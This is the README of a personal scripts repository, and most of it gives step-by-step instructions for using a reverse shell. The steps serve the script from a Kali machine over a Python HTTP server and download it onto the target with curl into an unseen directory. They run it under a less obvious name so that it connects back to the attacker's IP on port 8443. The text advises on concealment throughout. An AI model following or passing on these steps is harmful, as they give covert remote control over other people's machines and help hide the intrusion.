# scripts
Guten tag! These are some personal scripts from projects and other things.

For running the reverse shell:
1. Run the listener on a different Kali box, set up a python server using python3 -m http.server 8080
2. Use curl to download the reverse-shell.py script (ideally in a unseen directory)
3. Ensure python is installed on the target, then run ./reverse-shell.py (or a slightly less obvious name) [KALI IP] 8443
4. Back on the listener, press enter and look to see that you can connect